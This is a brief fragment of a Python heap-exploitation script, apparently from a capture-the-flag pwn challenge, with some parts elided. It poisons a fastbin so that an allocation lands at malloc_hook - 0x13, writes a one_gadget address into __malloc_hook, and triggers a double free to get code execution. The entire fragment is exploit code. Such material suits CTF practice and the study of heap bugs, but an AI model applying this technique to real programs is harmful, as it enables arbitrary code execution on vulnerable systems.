...
def exp():
  ...
  one_gadget = libc_base + one_gadget_offset3 #ONLY one_gadget3 satisfy
  ...
  add(0x60, p64(malloc_hook - 0x13)) #5 = 1, set fd = malloc_hook - 0x13
  add(0x60, '6')
  add(0x60, '7') #7 = 1
  add(0x60, '8'*3 + p64(one_gadget))
  delete(0)
  delete(0) #double free to invoke one_gadget
